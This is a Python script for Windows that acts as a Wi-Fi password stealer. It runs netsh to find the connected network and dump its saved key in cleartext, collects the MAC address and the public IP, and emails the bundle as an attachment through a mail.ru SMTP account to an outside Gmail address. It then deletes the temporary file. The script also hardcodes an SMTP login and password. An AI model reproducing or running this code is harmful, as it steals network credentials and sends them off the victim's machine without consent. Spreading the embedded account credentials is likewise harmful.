import smtplib, subprocess, bs4, requests, os
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from platform import python_version

word_s = str('SSID:')
word_s2 = str('BSSID:')
profile = ''
start = False
start_2 = '0'
cmd_txt = 'netsh wlan show interfaces >> meme.txt'
data_len = 0
data_len2 = 0
os.system(cmd_txt+'\n'+'CLS')
with open('meme.txt','r', encoding='cp866') as f:
    dat = f.read().split()
    start = True
    data_len_txt = (dat[data_len])
    data_len_txt2 = (dat[data_len2])
while data_len_txt != word_s:
    data_len+=1
    data_len_txt = (dat[data_len])
while data_len_txt2 != word_s2:
    data_len2+=1
    data_len_txt2 = (dat[data_len2])
data3 = (int(data_len2) - int(data_len))
if data3 == 1:
    for i in range(1,2):
        countl = 0
        countl = data_len+i
        profile+=dat[countl]+' '
        start_2 = '1.1'
if data3 == 2:
    for i in range(1,3):
        countl = 0
        countl = data_len+i
        profile+=dat[countl]+' '
        start_2 = '1.2'
if data3 == 3:
    for i in range(1,4):
        countl = 0
        countl = data_len+i
        profile+=dat[countl]+' '
        start_2 = '1.3'
if data3 == 4:
    for i in range(1,5):
        countl = 0
        countl = data_len+i
        profile+=dat[countl]+' '
        start_2 = '1.4'
if data3 == 5:
    for i in range(1,6):
        countl = 0
        countl = data_len+i
        profile+=dat[countl]+' '
        start_2 = '1.5'
if data3 == 6:
    for i in range(1,7):
        countl = 0
        countl = data_len+i
        profile+=dat[countl]+' '
        start_2 = '1.6'
if data3 == 7:
    for i in range(1,8):
        countl = 0
        countl = data_len+i
        profile+=dat[countl]+' '
        start_2 = '1.7'
profile=profile[:-8]
profile=('"'+profile+'"')
with open('meme.txt','w') as f:
    f.write('')
os.system('netsh wlan show profile '+profile+' key=clear >> meme.txt'+'\n'+'getmac >> meme.txt'+'\n'+'CLS')
with open('meme.txt','a') as cmd:
    cmd.write(profile)
with open('meme.txt','r', encoding='cp866') as f:
    pasp = f.read()
s = requests.get('https://2ip.ua/ru/')
b = bs4.BeautifulSoup(s.text, "html.parser")
a = b.select(" .ipblockgradient .ip")[0].getText()
a=a.split()
with open('meme.txt','w') as f:
    f.write(a[0]+'\n'+pasp)
with open('meme.txt','r') as f:
    email_go_txt = f.read()

server = 'smtp.mail.ru'
user = 'py.skp@mail.ru'
password = 'UKdpOIjDCvsq6dHSPYKQ'

recipients = ['alexkim0710@gmail.com']
sender = "py.skp@mail.ru"
subject = profile
text = str("SSID script: "+profile)
html = '<html><head></head><body><p>' + text + '</p></body></html>'

filepath = "meme.txt"
basename = os.path.basename(filepath)
filesize = os.path.getsize(filepath)

msg = MIMEMultipart('alternative')
msg['Subject'] = subject
msg['From'] = 'Python script <' + sender + '>'
msg['To'] = ', '.join(recipients)
msg['Reply-To'] = sender
msg['Return-Path'] = sender
msg['X-Mailer'] = 'Python/' + (python_version())

part_text = MIMEText(text, 'plain')
part_html = MIMEText(html, 'html')
part_file = MIMEBase('application', 'octet-stream; name="{}"'.format(basename))
part_file.set_payload(open(filepath, "rb").read())
part_file.add_header('Content-Description', basename)
part_file.add_header('Content-Disposition', 'attachment; filename="{}"; size={}'.format(basename, filesize))
encoders.encode_base64(part_file)

msg.attach(part_text)
msg.attach(part_html)
msg.attach(part_file)

mail = smtplib.SMTP_SSL(server)
mail.login(user, password)
mail.sendmail(sender, recipients, msg.as_string())
mail.quit()
os.remove('meme.txt')
print(start)
print(start_2)
e=input()
